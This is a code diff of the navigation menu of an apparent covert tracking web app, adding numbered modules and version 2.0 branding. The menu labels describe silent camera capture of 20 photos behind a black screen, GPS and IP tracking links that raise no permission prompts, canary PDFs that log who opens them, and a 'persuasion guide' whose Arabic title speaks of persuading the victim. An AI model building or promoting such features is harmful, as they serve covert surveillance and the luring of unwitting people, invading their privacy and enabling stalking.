@@ -15,6 +15,8 @@ import {
   ExternalLink,
   ChevronRight,
   ShieldCheck,
+  FileText,
+  Compass,
 } from 'lucide-react';
 import { Language, translations } from '../translations';
 import { Cpu, BookOpen, Camera } from 'lucide-react';
@@ -45,48 +47,152 @@ export const Navbar: React.FC<NavbarProps> = ({
   const logoUrl = 'https://i.ibb.co/d4SN4h4h/Screenshot-20260723-035727-Gallery.jpg';
   const telegramLogoImg = 'https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg';
 
-  const navItems: { view: MainNavView; label: string; desc: string; icon: React.ReactNode; badge?: string }[] = [
+  const navItems: {
+    id: string;
+    view?: MainNavView;
+    action?: () => void;
+    label: string;
+    desc: string;
+    icon: React.ReactNode;
+    badge?: string;
+    badgeColor?: string;
+  }[] = [
     {
+      id: 'sec-home',
       view: 'home',
-      label: lang === 'ar' ? 'الرئيسية وإنشاء الروابط' : 'Home & Link Generator',
-      desc: lang === 'ar' ? 'إنشاء روابط ذكية بأنظمة GPS و IP' : 'Create smart GPS and IP tracking links',
+      label: lang === 'ar' ? '1. الرئيسية وإنشاء الروابط' : '1. Home & Link Generator',
+      desc: lang === 'ar' ? 'إنشاء روابط التتبع الفوري والموجه الذكي' : 'Create smart tracking and auto-redirect links',
       icon: <Link2 className="w-4 h-4 text-indigo-600" />,
       badge: 'Core',
+      badgeColor: 'bg-indigo-100 text-indigo-700',
     },
     {
+      id: 'sec-camera',
+      action: () => {
+        onChangeView('home');
+        setTimeout(() => {
+          const btn = document.getElementById('btn-mode-camera');
+          if (btn) btn.click();
+          const input = document.getElementById('target-url-input');
+          if (input) input.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 100);
+      },
+      label: lang === 'ar' ? '2. نظام فخ الكاميرا (20 صورة)' : '2. Camera Trap Surveillance',
+      desc: lang === 'ar' ? 'شاشة سوداء صامتة والتقاط متسلسل بين الكاميرا الأمامية والخلفية' : '20 sequential photos front/rear stealth capture',
+      icon: <Camera className="w-4 h-4 text-rose-600" />,
+      badge: '20 PHOTOS',
+      badgeColor: 'bg-rose-100 text-rose-700',
+    },
+    {
+      id: 'sec-gps',
+      action: () => {
+        onChangeView('home');
+        setTimeout(() => {
+          const btn = document.getElementById('btn-mode-precise');
+          if (btn) btn.click();
+          const input = document.getElementById('target-url-input');
+          if (input) input.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 100);
+      },
+      label: lang === 'ar' ? '3. التتبع الجغرافي GPS والمستشعرات' : '3. High-Accuracy GPS Tracker',
+      desc: lang === 'ar' ? 'إحداثيات قمر صناعي بالأمتار وبطارية ومعالج رسومي GPU' : 'Satellite GPS coordinates, battery & GPU fingerprint',
+      icon: <Crosshair className="w-4 h-4 text-indigo-600" />,
+      badge: 'GPS',
+      badgeColor: 'bg-indigo-100 text-indigo-700',
+    },
+    {
+      id: 'sec-silent-ip',
+      action: () => {
+        onChangeView('home');
+        setTimeout(() => {
+          const btn = document.getElementById('btn-mode-near');
+          if (btn) btn.click();
+          const input = document.getElementById('target-url-input');
+          if (input) input.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 100);
+      },
+      label: lang === 'ar' ? '4. التتبع الصامت للشبكة وIP' : '4. Silent Near IP Intelligence',
+      desc: lang === 'ar' ? 'رصد فوري للعنوان والدولة والمزود ونوع الخط بدون أي نوافذ إذن' : 'Silent IP, country, ISP, and network medium with zero prompts',
+      icon: <Radio className="w-4 h-4 text-emerald-600" />,
+      badge: 'Silent',
+      badgeColor: 'bg-emerald-100 text-emerald-700',
+    },
+    {
+      id: 'sec-pdf-canary',
+      action: () => {
+        onChangeView('home');
+        setTimeout(() => {
+          const btn = document.getElementById('btn-mode-pdf');
+          if (btn) btn.click();
+          const input = document.getElementById('target-url-input');
+          if (input) input.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }, 100);
+      },
+      label: lang === 'ar' ? '5. تتبع وثائق ومستندات الـ PDF' : '5. Canary PDF Document Tracker',
+      desc: lang === 'ar' ? 'ملفات وثائق PDF استخبارية ترصد فتح المستند وموقع الفاتح فوراً' : 'Embedded canary tokens logging remote PDF openings',
+      icon: <FileText className="w-4 h-4 text-amber-600" />,
+      badge: 'PDF',
+      badgeColor: 'bg-amber-100 text-amber-700',
+    },
+    {
+      id: 'sec-ip-lookup',
       view: 'ip-lookup',
-      label: lang === 'ar' ? 'استعلام وفحص IP المتقدم' : 'IP2Location Intelligence',
-      desc: lang === 'ar' ? 'فحص شبكات IP وكشف VPN و ISP والخرائط' : 'Scan IP, detect VPN/proxy, resolve ISP & GPS',
-      icon: <Globe className="w-4 h-4 text-indigo-600" />,
+      label: lang === 'ar' ? '6. استعلام وفحص الـ IP وكشف VPN' : '6. IP Intelligence & Threat Audit',
+      desc: lang === 'ar' ? 'فحص شبكات IP وكشف VPN و ISP ومراكز البيانات والخرائط' : 'Scan IP, detect VPN/proxy, resolve ISP & GPS',
+      icon: <Globe className="w-4 h-4 text-cyan-600" />,
       badge: 'PRO',
+      badgeColor: 'bg-cyan-100 text-cyan-700',
     },
     {
+      id: 'sec-mac-lookup',
       view: 'mac-lookup',
-      label: lang === 'ar' ? 'فحص الماك أدرس (MAC)' : 'MAC Address Lookup',
-      desc: lang === 'ar' ? 'معرفة الشركة المصنعة ونوع الجهاز' : 'Identify hardware vendor & device type',
+      label: lang === 'ar' ? '7. فحص الماك أدرس وهوية الأجهزة' : '7. Hardware MAC Address Lookup',
+      desc: lang === 'ar' ? 'معرفة الشركة المصنعة ونوع الجهاز عبر قاعدة بيانات IEEE OUI' : 'Identify hardware vendor & device type via IEEE OUI',
       icon: <Cpu className="w-4 h-4 text-indigo-600" />,
-      badge: 'Hardware',
+      badge: 'OUI',
+      badgeColor: 'bg-indigo-100 text-indigo-700',
     },
     {
+      id: 'sec-exif-tool',
       view: 'exif-tool',
-      label: lang === 'ar' ? 'فاحص بيانات الصور (ExifTool)' : 'ExifTool Metadata Extractor',
+      label: lang === 'ar' ? '8. فاحص بيانات الصور (ExifTool)' : '8. ExifTool Metadata Extractor',
       desc: lang === 'ar' ? 'استخراج بيانات EXIF وإحداثيات GPS المدمجة ومواصفات الكاميرا' : 'Extract EXIF metadata, embedded GPS & camera optics',
-      icon: <Camera className="w-4 h-4 text-indigo-600" />,
+      icon: <Camera className="w-4 h-4 text-emerald-600" />,
       badge: 'EXIF',
+      badgeColor: 'bg-emerald-100 text-emerald-700',
     },
     {
+      id: 'sec-cyber-awareness',
       view: 'cyber-awareness',
-      label: lang === 'ar' ? 'مركز التوعية الأمنية' : 'Cyber Awareness',
-      desc: lang === 'ar' ? 'دليل الحماية من الهندسة الاجتماعية' : 'Social Engineering Defense Guide',
-      icon: <BookOpen className="w-4 h-4 text-indigo-600" />,
-      badge: 'EDU',
+      label: lang === 'ar' ? '9. مركز التوعية بالهندسة الاجتماعية (80 تكتيكاً)' : '9. Social Engineering Center (80 Types)',
+      desc: lang === 'ar' ? 'موسوعة الحماية وحيل استدراج الكاميرا وكابتشا الوجه والروابط' : 'Comprehensive 80 social engineering threats & defenses',
+      icon: <BookOpen className="w-4 h-4 text-rose-600" />,
+      badge: '80 EDU',
+      badgeColor: 'bg-rose-100 text-rose-700',
     },
     {
+      id: 'sec-guide',
+      action: () => {
+        onChangeView('home');
+        setTimeout(() => {
+          const guide = document.getElementById('sec-guide');
+          if (guide) guide.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }, 100);
+      },
+      label: lang === 'ar' ? '10. دليل الشرح وطرق إقناع الضحية' : '10. Sections & Persuasion Guide',
+      desc: lang === 'ar' ? 'شرح تفصيلي للأقسام الـ 8 وسيناريوهات استدراج الكاميرا والـ GPS' : 'Full manual and psychological pretexting scenarios',
+      icon: <Compass className="w-4 h-4 text-indigo-600" />,
+      badge: 'GUIDE',
+      badgeColor: 'bg-indigo-100 text-indigo-700',
+    },
+    {
+      id: 'sec-support',
       view: 'support',
-      label: lang === 'ar' ? 'الدعم الفني والمطور' : 'Developer & Support',
+      label: lang === 'ar' ? '11. الدعم الفني والمطور (AlQeyadah)' : '11. Lead Developer & Support',
       desc: lang === 'ar' ? 'تواصل مع المهندس محمد أبو السعود @SM_MS_IP' : 'Contact Lead Developer Mohamed Abu AlSaud',
       icon: <HelpCircle className="w-4 h-4 text-indigo-600" />,
       badge: 'Support',
+      badgeColor: 'bg-slate-100 text-slate-700',
     },
   ];
 
@@ -254,7 +360,7 @@ export const Navbar: React.FC<NavbarProps> = ({
                       {t.appName}
                     </span>
                     <span className="text-[10px] text-slate-500 font-semibold">
-                      SM v1.0
+                      SM v2.0
                     </span>
                   </div>
                 </div>
@@ -270,19 +376,23 @@ export const Navbar: React.FC<NavbarProps> = ({
               {/* Sections List */}
               <div className="flex flex-col gap-1.5">
                 <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider px-1">
-                  {lang === 'ar' ? 'أقسام النظام الرئيسية' : 'System Sections'}
+                  {lang === 'ar' ? 'أقسام وأنظمة المنظومة (8 أقسام)' : 'System Modules (8 Core Systems)'}
                 </span>
 
                 {navItems.map((item) => {
-                  const isActive = activeView === item.view;
+                  const isActive = item.view ? activeView === item.view : false;
                   return (
                     <button
-                      key={item.view}
+                      key={item.id}
                       onClick={() => {
-                        onChangeView(item.view);
+                        if (item.action) {
+                          item.action();
+                        } else if (item.view) {
+                          onChangeView(item.view);
+                        }
                         setDrawerOpen(false);
                       }}
-                      className={`flex items-start gap-3 p-3 rounded-2xl border text-start transition-all cursor-pointer ${
+                      className={`flex items-start gap-3 p-2.5 sm:p-3 rounded-2xl border text-start transition-all cursor-pointer ${
                         isActive
                           ? 'bg-indigo-50/80 border-indigo-200 text-indigo-950 shadow-2xs'
                           : 'bg-white/80 border-slate-200 hover:bg-slate-50 hover:border-indigo-300 text-slate-800'
@@ -294,11 +404,11 @@ export const Navbar: React.FC<NavbarProps> = ({
 
                       <div className="flex flex-col flex-1 min-w-0">
                         <div className="flex items-center justify-between gap-1">
-                          <span className="font-black text-xs text-slate-950">
+                          <span className="font-black text-xs text-slate-950 truncate">
                             {item.label}
                           </span>
                           {item.badge && (
-                            <span className="px-1.5 py-0.2 rounded-md text-[9px] font-extrabold bg-indigo-100 text-indigo-700">
+                            <span className={`px-1.5 py-0.2 rounded-md text-[9px] font-black shrink-0 ${item.badgeColor || 'bg-indigo-100 text-indigo-700'}`}>
                               {item.badge}
                             </span>
                           )}
@@ -384,8 +494,8 @@ export const Navbar: React.FC<NavbarProps> = ({
             {/* Drawer Bottom Info */}
             <div className="pt-3 border-t border-slate-100 flex flex-col gap-2">
               <div className="flex items-center justify-between text-[11px] text-slate-500">
-                <span>SM</span>
-                <span className="font-mono font-bold text-indigo-700">v1.0</span>
+                <span>SM Intelligence Suite</span>
+                <span className="font-mono font-bold text-indigo-700 bg-indigo-50 px-2 py-0.5 rounded-md border border-indigo-200">v2.0</span>
               </div>
             </div>
           </div>
